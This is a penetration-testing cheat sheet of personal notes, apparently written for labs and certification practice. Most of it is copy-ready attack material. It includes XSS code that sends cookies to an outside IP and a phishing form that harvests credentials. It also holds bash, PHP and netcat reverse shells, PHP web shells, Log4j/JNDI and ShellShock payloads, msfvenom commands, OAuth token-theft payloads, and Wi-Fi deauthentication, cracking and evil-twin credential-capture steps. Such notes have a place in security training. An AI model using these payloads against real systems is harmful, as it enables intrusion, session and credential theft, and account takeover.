    newDiv.appendChild(newContent);
    const currentDiv = document.getElementById("div1");
    document.body.insertBefore(newDiv, currentDiv);
  }
```
or
```javascript 
/// https://bobbyhadz.com/blog/javascript-create-image-element
const image = document.createElement('img');

// 👇️ Local image
// image.setAttribute('src', 'my-img.png');

// 👇️ Remote image
image.setAttribute(
  'src',
  'x',
);


image.onerror = function handleError() {
  fetch("http://192.168.49.191/c?a=" + document.cookie)
  // 👇️ Can set image.src to a backup image here
  // image.src = 'backup-image.png'

  // 👇️ Or hide image
  // image.style.display = 'none';
};

image.onload = function handleImageLoaded() {
    fetch("http://192.168.49.191/c?a=" + document.cookie)
    // 👇️ Can set image.src to a backup image here
    // image.src = 'backup-image.png'
  
    // 👇️ Or hide image
    // image.style.display = 'none';
  };

const box = document.getElementById('box');
box.appendChild(image);
```

![](2022-07-25-13-07-03.png)


### Phish em

- xss with

`<img src='x' onerror='window.location.href="http://192.168.49.105/login3.html"'>`

```html
<form action="http://192.168.49.105/asd" method="GET">
    <h1 class="h3 mb-3 fw-normal">Please sign in</h1>

    <div class="form-floating text-dark">
      <input type="text" class="form-control" id="floatingInput" placeholder="name@example.com" name="username">
      <label for="floatingInput">Username</label>
    </div>
    <div class="form-floating text-dark">
      <input type="password" class="form-control" id="floatingPassword" placeholder="Password" name="password">
      <label for="floatingPassword">Password</label>
    </div>

    <button class="w-100 btn btn-lg btn-primary" type="submit">Sign in</button>
  </form>
```


### JWT

[Hacktricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
[Netsparker JWT attacks](https://www.netsparker.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/)

- HEADER, PAYLOAD, SIGNATURE **_Decode from base64_**
- Try setting ALG to "none" **_should be small letters and then urlencode ==_** then remove signature but leave the last `.`
- If you have the public key and the token is using RS256 > change to HS256 **_Script in /etc_**
- If there's a Key ID or KID in the Header part - test for SQLi or Directory Traversal. `"kid":"../../../../dev/null"` **_this will sign the token with dev/null which is empty_**
- Sometimes the output is not in quotes try to add quotes ex output: `{"user":admin}` make it `{"user":"admin"}` before encoding to base64 **_Edit: looks like this only applies in scripting, if done in jwt.io do not add quotes. still need to confirm_**
- try to replace kid value with command execution see Hacktricks link
- From pentesterlab `{"typ": "JWT", "alg": "HS256", "kid": "|<command>"}` **_CVE-2017-17405 impacting Ruby Net::FTP_**
- bruteforce jwt secret using john `john jwt.token --wordlist=wordlist.txt --format=HMAC-SHA256`
- SQLi in jwt see Hacktricks link. `' UNION SELECT 'ATTACKER';-- -` then set the secret to `ATTACKER`
- Sometimes they don't even verify the signature, so just try changing the user to admin.
- `jku` header devs can use public key from URLs inside using the jku header, attackers can host their self signed jwk file. [Ippsec UniCode video](https://www.youtube.com/watch?v=2mH6Ri7EAq0)


#### Using Burp

- INSTALL `JWT editor` in burp and try the following

- alg to none
- Bruteforce Signing key
  - bruteforce weak key `hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list `
  - generate new symmetric key use the bruteforced secret replace `k` value in key with base64 encoded secret

- Insert `jwk`
  - generate an RSA key
  - embed jwk

- Inject `jku`
  - generate an rsa key
  - copy as public jwk
  - host 
  - edit the header add `"jku":"host location"`
  - edit the kid of the jwt to the same one within the public jwk
  - sign the jwt
  - done


### CORS Misconfiguration

- Check for *Access-Control-Allow-Origin:* and *Access-Control-Allow-Credentials:* in response.
- Add Origin header in request - try `Null`
- More payloads [PayloadAlltheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
- add *Origin:* header if it gets reflected in the response *Access-Control-Allow-Origin:* try *offsecscript/cors/cors.html*

### Samesite

Some browsers will block a cookie with `SameSite=None` if the `Secure` flag is not also set.

`Lax` - not to send the cookie on cross-site requests. However, the browser will send the cookie during navigation when a user manually enters the URL in the browser or clicks a link to the site

`Strict` - will only send cookie if the request is same domain with cookie


```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','$url/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

### Git Information Leak

- Check for `.git` directory
- `wget -r` then `git diff` `git diff HEAD~1 or 2` and so on to show previous commit changes
- `.git` might not be accessible but `/.git/HEAD` or `config` might be. nice to check.
- `git log`
- Don't forget to `git init`
- first 2 characters is directory `c3646db7f9c7e6f126c75900fdcce16d50e1da82` = `/.git/objects/c3/646db7f9c7e6f126c75900fdcce16d50e1da82`
- `git cat-file -p c3646db7f9c7e6f126c75900fdcce16d50e1da82`
- or use git tools [extractor](https://github.com/internetwache/GitTools/tree/master/Extractor)

### HTTP Request Smuggling

[portswigger video](https://www.youtube.com/watch?v=CpVGc1N_2KU)
[Albinowax' research](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn#demo)

Detecting
- Issue an ambiguous request followed by a normal 'victim' request, then observe whether the latter gets an unexpected response. **_prone to false negatives_**

If CL.TE the following will cause an observable delay.
If server is in sync this will get rejected OR harmlessly processed
If TE.CL the front end will reject the message without ever forwarding to the backend because of invalid chunk size 'Q'
```html
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

1
Z
Q


```

If TE.CL
```html
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

0

X


```
- ALWAYS test for CL.TE first if we do TE.CL and the server is CL.TE this will poison the backend and potentially harming legitimate users.
- Disable in Burp > Repeater > Update Content-Length
Exploiting

If CL.TE
```html
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

0

X


```

- to exploit replace X with :
```html
GET /404 HTTP/1.1
X`
```

IF TE.CL
```html
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

## FTP

- FTP SSL? `openssl s_client -connect <ip>:<port> -starttls ftp`
- lftp 
```
lftp
set ftp:ssl-force true
set ssl:verify-certificate no
connect <ip>
username
```


## NFS

- showmount -e `ip`
- mount `10.10.10.10:/share`

## Serializations

### PHP

[SnoopySec]
(https://snoopysecurity.github.io/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html)
- Look for `unserialize()`
- Adding Tilde(~) when requesting PHP might show the source code
- look for _destruct() or _wakeup() [Owasp](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)   

### Java

- serialized object often is encoded with these as the beginning characters `ac ed` for hex or `rO0` for base64
- look for `readObject()` method used to read and deserialize data from an `InputStream`
## Log4j

- `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "https://c6c9-202-89-151-235.ngrok.io:8888/log4jrce"`
- `${jndi:ldap://10.10.14.2:1337/a}`
- [ysoserial-modified](https://github.com/pimps/ysoserial-modified)
   - `java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.6/9002 0>&1' > ~/htb/logforge/ysoserial.ser` **_Creates a serialized payload_**
- [JNDI-exploit-kit](https://github.com/pimps/JNDI-Exploit-Kit)
   - `java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.6:1389 -P ~/htb/logforge/ysoserial.ser` **_Listens to port 1389 then sends ysoserial.ser_**
   - after running ysoserial-modified we will get links for different versions for jdk to try out. `${jndi:ldap://10.10.14.6:1389/vojbuj}`
- `${jndi:ldap://10.10.14.2:1337/${sys:java.class.path} or ${java:version} or ${java:os}}` **_or can be replaced with .... to do nested thingy_**
- Using JRMPListener to send CommonsCollections `java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1337 CommonsCollections5 "**_CMD_**"` **_this will set up a listener listening on port 1337. send your payload `${jndi:rmi://10.10.10.10:1337/a}` and should receive something.
```Java
public class Log4jRCE {
    static {
        try {
            String [] cmd={"touch", "/tmp/TEST"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

## Apache

- Apache on 80 Tomcat on 8080
- encoding of .. = %252e%252e

### Tomcat 
[Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat)
- access manager bypass `<ip>/whatever/..;/manager/html`
- `msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.14.2 LPORT=9001 -f war -o hyst.war`
- `/manager/html/expire?path=/` **_0xdf used this to test for log4j using Post and jndi payload as body_**


## One-Liners

- `<?php system($_REQUESTS['hyst']); ?>`
- `<?php system($_GET["cmd"]);?>`
- `<?php print exec('command'); ?>`
- `<?php echo file_get_contents('/home/carlos/secret'); ?>`

## ShellShock

- To detect `nmap 10.10.10.56 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh`
- `() { :;}; echo; **_CMD_**` CMD SHOULD BE ABSOLUTE PATH `/usr/bin/whoami`
- Echo is used to add a blank space between headers and body output
- Try in User-Agent or Cookie
- `curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.2/9001 0>&1"' http://10.10.10.56/cgi-bin/user.sh`

## C app / binaries

- Use gdb / strace
- crash the app then have a look at `/var/crashes` use `apport-unpack`
- [Node Ippsec](https://www.youtube.com/watch?v=sW10TlZF62w)
- `gdb ./binary`
  - `layout asm`
  - create a breakpoint `break *(main+103)`
  - `run`
  - jump to what ever `jump *(main+109)`

## GPG/PGP/ASC

- `gpg2john test.asc > hash`
- `john --format=gpg hash --wordlist=rockyou.txt`
- `gpg --import <file.asc>`
- `gpg -d <creds.gpg>`

## CBC-MAC

- **_IV_** is set as a cookie in response after logging in


## GraphiQL

- Look for **_/graphql_** enpoints - might show web based IDE - or convert the following to proper json and use burp - replace newline with \n? and then insert it to query part of the post body.

<details>
  <summary>Recent Versions</summary>
  
  ```sql
  query IntrospectionQuery {
    __schema {
      queryType { name }
      mutationType { name }
      subscriptionType { name }
      types {
        ...FullType
      }
      directives {
        name
        description
        args {
          ...InputValue
        }
        locations
      }
    }
  }

  fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
      name
      description
      args {
        ...InputValue
      }
      type {
        ...TypeRef
      }
      isDeprecated
      deprecationReason
    }
    inputFields {
      ...InputValue
    }
    interfaces {
      ...TypeRef
    }
    enumValues(includeDeprecated: true) {
      name
      description
      isDeprecated
      deprecationReason
    }
    possibleTypes {
      ...TypeRef
    } 
  }   
      
  fragment InputValue on __InputValue {
    name
    description
    type { ...TypeRef }
    defaultValue
  }     
        
  fragment TypeRef on __Type {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
        }
      }
    } 
  }
  ```
  
</details>

<details>
  <summary>Older Versions</summary>

  ```sql
  query IntrospectionQuery {
    __schema {
      queryType { name }
      mutationType { name }
      subscriptionType { name }
      types {
        ...FullType
      }
      directives {
        name
        description
        args {
          ...InputValue
        }
        onOperation
        onFragment
        onField
      }
    }
  }

  

  fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
      name
      description
      args {
        ...InputValue
      }
      type {
        ...TypeRef
      }
      isDeprecated
      deprecationReason
    }
    inputFields {
      ...InputValue
    }
    interfaces {
      ...TypeRef
    }
    enumValues(includeDeprecated: true) {
      name
      description
      isDeprecated
      deprecationReason
    }
    possibleTypes {
      ...TypeRef
    }
  }

  fragment InputValue on __InputValue {
    name
    description
    type { ...TypeRef }
    defaultValue
  }

  fragment TypeRef on __Type {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
        }
      }
    }
  }
```  
</details>

```sql
query MyQuery {
   __schema {
    types {
      name
      fields {
       name
      } 
    
    }
  }
}
```
``` sql  
  query Query {
  ptlabkeys {
    value
  }
}
```
## Source Code Reviews

[GoldMine](https://z-r0crypt.github.io/blog/2020/01/22/oswe/awae-preparation/)

### PHP

- Directory Traversal
```php
public static function list_files_for_user($username) {
	  $base = "files/".$username;  ### Vulnerability as user controlled input is getting concatenated. user input can be `../../../etc/passwd?`
	  if (!file_exists($base)) {
	    mkdir($base);
	  }
	  return array_diff(scandir($base), array('..', '.'));
	}
```
- File Upload Bypass
```php
	  public static function addfile($user) {
	  $file = "files/".basename($user)."/".basename($_FILES["file"]["name"]);
	  if (!preg_match("/\.pdf/", $file)) { #Does not stop the user from uploading shell.pdf.php need to add $ to properly regex.
	    return  "Only PDF are allowed";
	  } elseif (!move_uploaded_file($_FILES["file"]["tmp_name"], $file)) {
	    return "Sorry, there was an error uploading your file.";
	  }
	  return NULL;
	}
```

### ASP.NET 

- Views = contains html pages **_.cshtml extension_** = c#html, gets list of data from controller
- Model = data related = classes, sql statements, gives controller with list of objects

## Google Dorks

- site: include only results on a given hostname.
- intitle: filtest according to the title of a page.
- inurl: filters according to url of a resource.
- filetype: filters according to file extensions.
- `-` filters out keywords

## Buffer Overflow BOF

- Main goal is to overflow buffer space to overwrite EIP(Extended Instruction Pointer)

Steps in BOF

- Spiking: Finding vulnerable part of the program
- Fuzzing: Sending characters to the vulnerable part of the program to break it
- Finding Offset: This is where the program crashes
- Overwrite the EIP using the Offset found
- Find the right module
- Shellcode

Tools

- Immunity Debugger
- generic_send_tcp

### Spiking 

- readelf -s `program`

```C
  s_readline();
  s_string("TRUN ");
  s_string_variable("0");
```

### Metasploit module for pattern

```bash
pattern_create.rb -l "bytes"
pattern_offset -l "bytes" -q "what data is in EIP HEX"
```

[Bad Character Checker](https://github.com/cytopia/badchars)

### Finding Modules

- [Finding Modules - Mona](https://github.com/corelan/mona)
- nasm_shell.rb
- `msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT EXITFUNC=thread -f c -a x86 -b "badcharacters"`

### Shell example

- `shellcode= "A" * 2002 + "\xaf\x11\x50\x62 - this address is from nasm_shell.rb JMP ESP" + "\x90" * 32 + overflowfrommsfvenom`


## OAuth

[Cheatsheet](https://0xn3va.gitbook.io/cheat-sheets/web-application/oauth-2.0-vulnerabilities)

In OAuth 2.0, the client requests access to resources controlled by the resource owner and hosted by the resource server and is issued a different set of credentials than those of the resource owner. Instead of using the resource owner's credentials to access protected resources, the client obtains an access token.

- Resource Owner = ME
- Resource Server = API I want to access
- Client = Web server that wants to access the API
- Auth server = OID server.

### OAuth 2.0

- Oauth that uses implicit grant, this one does not request for a code but goes directly to ask for a token. 
- Hijack account using redirect_uri
  - Intercept the request that asks for a code
  - change the redirect_uri to your server.
  - send payload to victim.
  - If the victim loads the payload your server will get a valid code to continue the flow and get a valid token of the victim

EX. payload

```html
<iframe src="https://oauth-ac361fb21ebd0c90c081232a02a0000f.web-security-academy.net/auth?client_id=onpkl0n5tyylthtolkxnr&redirect_uri=https://exploit-ac961f381edb0cdcc03b232201d80044.web-security-academy.net/exploit&response_type=code&scope=openid%20profile%20email"></iframe> 
```

- Steal token via open redirect example from portswigger.

```html
<script>
  if (!document.location.hash) {
    window.location = 'https://oauth-ac5c1fa71f183ad6c01d63bf029c0093.web-security-academy.net/auth?client_id=nl739ogh6wfprguffv3pu&redirect_uri=https://ac5f1fde1fef3aeec00463d7000f0082.web-security-academy.net/oauth-callback/../../../../post/next?path=https://exploit-ac5f1ff41fce3a1ec0366355011f0094.web-security-academy.net/exploit&response_type=token&nonce=-233235662&scope=openid%20profile%20email'
  } else {
    window.location = '/?'+document.location.hash.substr(1)
  }
</script>
```

- Steal token via comments example from portswigger.

```html
<iframe src="https://oauth-ac5b1f091ebc87a7c0231e43020600b9.web-security-academy.net/auth?client_id=flf29axxxdwj96jjj8qi0&redirect_uri=https://ac441fd31e7c8793c0611e60007e0029.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>

<script>
  window.addEventListener('message', function(e) {
    fetch("/" + encodeURIComponent(e.data.data))
  }, false)
</script> 
```

## Spring boot

- White Label error page means its spring boot try /actuator/env [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators)

## Business Logic

- Try setting values to negative then add positive value = free stuff?
- Try reaching max int value 2,147,483,647
- Check registrations for example email characters limited to 255 [PortSwigger Lab](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)
- does change email function send confirmation email
- delete parameters? example in forgot password function delete current password?
- coupon codes? tried sending same code via repeater. alternate two codes.


## Better PTY?

- `stty raw -echo` always fails for me instead use `rlwrap -car nc -lvnp 9001` then use the usual `python3 -c 'import pty;pty.spawn("/bin/bash");'`
  - Now you have clear autocomplete and everything!


## Privesc Stuff

### Linux

- linux exploit suggester.sh
- Sudo rights on a file?
  - Do you own the file? edit.
  - hijack variable **_Path variable Vulnerability_**
- Symlink? Has write permission to something linked to another file? change symlink with `ln -fns /tmp/newlink /var/www/html/itemtolink`

## DNS

Port 53 Open

- Nslookup
  - SERVER `<IP>`
    - Search for `127.0.0.1` and `<IP>`
- Zone Transfer
  - `dig axfr@<ip> <hostname>`


## PHPINFO()

[Insomnia #1 <3](https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)

- Check for `file_uploads = on` in phpinfo > meaning any php request will accept uploaded files

## MongoDB

- likes everything in json
- `mongo <dbs> -u <user> -p`
- `db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod g+s /tmp/tom; chmod u+s /tmp/tom"});`

## Thick Client Testing

- Nmap box before installing target app then nmap again after
- install [Microsoft Attack Surface Analyzer](https://github.com/microsoft/AttackSurfaceAnalyzer) run before installing the target app then run again after 
- Sysinternals
- DLL Hijacking [Hijacklib](https://hijacklibs.net/)

## fast as ffff scan

- `sudo masscan 192.168.141.90 -p0-65535 --rate 1000 -e tun0`
- `masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0` //might miss something
- `sudo nmap --min-rate 4500 --max-rtt-timeout 1500ms 192.168.141.90 -p-`

## Wifi Pentesting

- `sudo airmon-ng` shows our device's driver.


```bash
kali@kali:~$ sudo airmon-ng

PHY     Interface       Driver          Chipset

phy0    wlan0           ath9k_htc       Qualcomm Atheros Communications AR9271 802.11n
```

- `iw` new command
- `sudo iw dev wlan0 scan | egrep "DS Parameter set|SSID:` get the channel
- `sudo iw dev wlan0 interface add wlan0mon type monitor` use wlan0 to setup wlan0mon in monitor mode
- `sudo ip link set wlan0mon up` bring wlan0mon up
- `sudo iw dev wlan0mon info` show wlan0mon info
- `sudo iw dev wlan0mon interface del` remove

- Use the following script so wireshark can scan all channels. Wireshark doesnt channel hop. or you can just use `Airodump-ng` :P
```bash
for channel in 1 6 11 2 7 10 3 8 4 9 5
do
  iw dev wlan0mon set channel ${channel}
  sleep 1
done
```
- `sudo airmon-ng check <kill>` checks for processes that might interfere with aircrack suite, adding kill will gracefully kill the processes identified.

### Airmon-ng

Used to setup monitor mode

- `sudo airmon-ng start <wlan0>` - change to monitor mode, will result to wlan0mon
- `sudo iw dev wlan0mon info` - check current channel
- `sudo airmon-ng stop wlan0mon`
- 

### Airodump-ng

Used to capture raw 802.11 frames, suitable for collecting WEB IVs or WPA/WPA2 handshakes which will be used with Aircrack-ng

- `-w prefix` 	Saves the capture dump to the specified filename
- `--bssid BSSID` 	Filters Airodump-ng to only capture the specified BSSID
- `-c channel(s)` 	Forces Airodump-ng to only capture the specified channel(s)

Sniffing with Airodump-ng

- `sudo airodump-ng wlan0mon -c 2`

The top portion provides information about detected APs along with the encryption in use, network names, etc.
The lower portion provides information about stations sending frames and the associated AP. 
See [Aircrack website](https://www.aircrack-ng.org/doku.php?id=airodump-ng) for more info.

- `sudo airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w cap1 wlan0mon` `-w` outputs the file as `cap1`

### Aireplay-ng

Generate wireless traffic. Used with Aircrack-ng to crack WEP keys

Basic Injection Test

- Make sure you are in the same CH as the AP `sudo airmon-ng start wlan0 <CH#>`
- `sudo aireplay-ng -9 wlan0mon`
- `sudo aireplay-ng -9 -e wifu -a 34:08:04:09:3D:38 wlan0mon` Injection test specific SSID `-e` SSID/ESSID `-a` BSSID

### Aircrack-ng

Can crack WEP and WPA/WPA2 networks that use pre-shared keys or PMKID
[Nice Tut](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)

- Put wlan0 to monitor mode
- `sudo airodump-ng wlan0mon` dump all wireless
- List down details of our target BSSID(Mac address of AP), Station(Client connected Mac address), AUTH(PSK)
- Look for AUTH column, should be PSK. aircrack-ng does not work with Enterprise(MGT), Opportunistic Wireless Encryption(OWE) cannot be cracked yet.
- use airodump again against the specific AP target `sudo airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon` this will save the result to wpa.cap
- Aireplay to deauth the client and capture 4-way Handshake `sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon` The `-0 1` means Deauth once.
- Once client reconnects we will be able to capture a handshake
- let airodump run for a bit.
- Use aircrack to Crack the handshake `aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap`
- confirm passphrase `airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap`

Failed to get a handshake?

- Try sending deauth as broadcast. omit `-c`
- 802.11w can't do anything but to wait for a client to connect.

Custom Wordlist for Aircrack

- jtr
- crunch
- mangler

Cracking with Hashcat

- convert pcap to hccapx `/usr/lib/hashcat-utils/cap2hccapx.bin <.pcap> output.hccapx`
- `hashcat -m 2500 output.hccapx /usr/share/joh/password.lst`

### Airolib-ng

Used to compute Pairwise Master Keys(PMK) and use them in order to crack WPA and WPA2 PSK passphrases.

- `echo wifu > essid.txt`
- `airolib-ng wifu.sqlite --import essid essid.txt`
- `airolib-ng wifu.sqlite --stat`
- `airolib-ng wifu.sqlite --import passwd <wordlist>`
- `airolib-ng wifu.sqlite --batch`
- `aircrack-ng -r wifu.sqlite <pcap>`

### CoWPAtty

Used for rainbow table attacks to crack WPA passphrases

- `genpmk -f <wordlist> -d outfile -s wifu` kinda like airolib
- `cowpatty -r <pcap> -d <outfilefromgenpmk> -s wifu`

### Attacking WPS

- `wash -i wlan0mon` to know version of WPS, LCK column indicicates if WPS is locked(cant attack)
- `sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K` `-K` means we are using pixieWPS

### Attacking WPA Enterprise (MGT)

- `sudo airodump-ng wlan0mon` to identify target
- `sudo airodump-ng -c 2 -w Playtronics wlan0mon` to scan specifically on ch 2 and save data to Playtronics file
(Getting CERT is OPTIONAL SKIP to hostapd-mana)
- `sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon` deauth a client to get the cert
- when client reconnects and airodump-ng indicates handshake has been captured. stop the capture and run wireshark. locate the server certificate frame. 
- `tls.handshake.type == 11` or `tls.handshake.certificate` filter used to find cert in wireshark
- In the Packet Details pane. Transport Layer Security > TLSv1.2 Record Layer: Handshake Protocol: Certificate > handshake protocol: certificate > Certificates
- for each certificate: right click and select `Export Packet Bytes` ti save the data into a `.der` file.
- certificates can be checked using `openssl x509 -inform der -in CERTIFICATE_FILENAME -text`
- not necessary but can be `.der` can be converted to `.pem` using `openssl x509 -inform der -in CERTIFICATE_FILENAME -outform pem -out OUTPUT_PEM.crt`
- go to `/etc/freeradius/3.0/certs` and edit `ca.cnf`  and `server.cnf`
- run `rm dh` and then `make` inside the `certs` dir
- edit `/etc/hostapd-mana/mana.conf`
- `sudo hostapd-mana /etc/hostapd-mana/mana.conf`
- cracking hash using `asleap` `asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst`



```bash
...
[certificate_authority]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = ca@playtronics.com
commonName              = "Playtronics Certificate Authority"
...
```
```bash
...
[server]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = admin@playtronics.com
commonName              = "Playtronics"
...
```
hostapd-mana config
```bash
interface=wlan1
ssid=<ESSID>
hw_mode=g
channel=6
auth_algs=3
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
ieee8021x=1
eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=/root/certs/ca.pem
server_cert=/root/certs/server.pem
private_key=/root/certs/server.key
dh_file=/root/certs/dhparam.pem
mana_wpe=1
mana_eapsuccess=1
mana_credout=hostapd.creds
```

### Captive Portals

- `sudo airodump-ng -w discovery --output-format pcap wlan0mon`
- `sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0mon`
- build captive portal
  - `sudo apt install apache2 libapache2-mod-php`
  - `wget -r -l2 https://www.megacorpone.com`
  - `sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/`
  - `sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/`

`nmcli device wifi connect <SSID> password <password>`


## SNMP

- `snmp-check <ip>`
- `snmpwalk -c public -v1 -t 10 <ip>`
- `auxiliary/scanner/snmp/snmp_enum `
- `onesixtyone -c dict.txt 10.129.42.254`
- onesixtyone used to bruteforce snmp community string
- black hole mode enabled? theres an RCE for SMTP 

## Tools

### NMAP

- `-sv` > Service Version > used for banner grabbing

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38
```

- scripts > `/usr/share/nmap/scripts`
- `nmap -p80 --script=http-methods --script-args http-methods.url-path='/wp-includes/' $IP`

Safe won't do anything intrusive like write files on target, bruteforce, do high traffic stuff

### Cewl

`sudo cewl -d 2 -m 5 -w Wordlist.txt example.com`


### Wfuzz

parameter discovery

`burp-parameter-names.txt`

`wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 "http://target:80/index.php?FUZZ=data"`

`wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" http://target:80/wp-login.php`

`wfuzz -c -z file,/home/all3n/tools/SecLists/Passwords/rockyou.txt --hw 325 -d "username=bob&password=FUZZ" -b 'PHPSESSID=2455efd8379026e261ef78186cebfc42' http://192.168.191.121/dev/index.php`

- Try fuzzing for files that ends with xml aswell and anyother types txt,csv,bak etc.

Vhost fuzzing

`wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: preprod-FUZZ.host.com" --hc 200 --hw 356 -t 100 10.10.10.101`

### Hakrawler

Uses The wayback Machine to gather directories.

### Shells

```php
php -r '$sock=fsockopen("10.0.0.1",80);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",80);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",80);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",80);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",80);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```
### Windows Stuff

What to do - I have a foothold how do I get a reverse shell?

- `powershell -c cd C:\Users\myuser\Downloads; .\nc64.exe -e cmd.exe myip myport` [nc](https://github.com/int0x33/nc.exe/tree/master)

### Active Directory

- AD DS Data Store contains the DB files and processes that store and manage directory information for users, services, and applications.
  - Consists of the `Ntds.dit` file
  - Stored by default in the %SystemRoot%\NTDS folder on all domain controllers
  - Only accessible through the DC processes and protocols